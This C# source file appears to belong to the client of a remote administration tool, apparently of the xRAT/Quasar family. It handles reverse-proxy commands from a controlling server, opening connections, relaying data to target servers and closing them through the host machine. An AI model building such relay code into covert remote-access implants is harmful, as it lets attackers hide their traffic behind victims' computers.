using xClient.Core.Networking;
using xClient.Core.Packets;
using xClient.Core.ReverseProxy.Packets;

namespace xClient.Core.ReverseProxy
{
    public class ReverseProxyCommandHandler
    {
        public static void HandleCommand(Client client, IPacket packet)
        {
            var type = packet.GetType();

            if (type == typeof (ReverseProxyConnect))
            {
                client.ConnectReverseProxy((ReverseProxyConnect) packet);
            }
            else if (type == typeof (ReverseProxyData))
            {
                ReverseProxyData dataCommand = (ReverseProxyData)packet;
                ReverseProxyClient proxyClient = client.GetReverseProxyByConnectionId(dataCommand.ConnectionId);

                if (proxyClient != null)
                {
                    proxyClient.SendToTargetServer(dataCommand.Data);
                }
            }
            else if (type == typeof (ReverseProxyDisconnect))
            {
                ReverseProxyDisconnect disconnectCommand = (ReverseProxyDisconnect)packet;
                ReverseProxyClient socksClient = client.GetReverseProxyByConnectionId(disconnectCommand.ConnectionId);

                if (socksClient != null)
                {
                    socksClient.Disconnect();
                }
            }
        }
    }
}